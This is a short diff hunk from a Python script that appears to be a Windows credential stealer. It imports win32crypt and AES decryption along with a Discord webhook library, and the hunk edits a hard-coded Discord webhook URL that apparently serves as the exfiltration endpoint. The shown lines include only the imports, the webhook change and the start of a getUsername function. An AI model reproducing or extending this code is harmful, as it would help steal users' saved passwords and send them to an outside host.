@@ -7,7 +7,7 @@ from discord_webhook import DiscordWebhook
 from Crypto.Cipher import AES
 import win32crypt
 
-WEBHOOK = 'https://discord.com/api/webhooks/1095102175551696926/FoYrcSnMlyg6davQV_x0leIi8qPLn8RcsSTwpcYSA0qfPiXfrIoTevGkeHf_J44aq-N'
+WEBHOOK = 'https://discord.com/api/webhooks/1095102175551696926/FoYrcSnMlyg6davQV_x0leIi8qPLn8RcsSTwpcYSA0qfPiXfrIoTevGkeHfaq-N'
 
 def getUsername():
     try:
